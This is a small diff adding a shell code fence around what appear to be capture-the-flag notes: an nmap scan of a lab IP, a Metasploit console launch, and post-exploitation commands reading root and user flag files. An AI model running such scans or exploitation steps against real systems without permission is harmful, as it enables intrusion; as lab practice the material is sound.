@@ -1,3 +1,4 @@
+```shell
 nmap -sV -sC -vv -oA scans/initial 10.10.79.75
 
 msfconsole
@@ -11,3 +12,4 @@ msfconsole
 			whoami
 			cat /root/root.txt
 			cat /home/dark/user.txt
+```
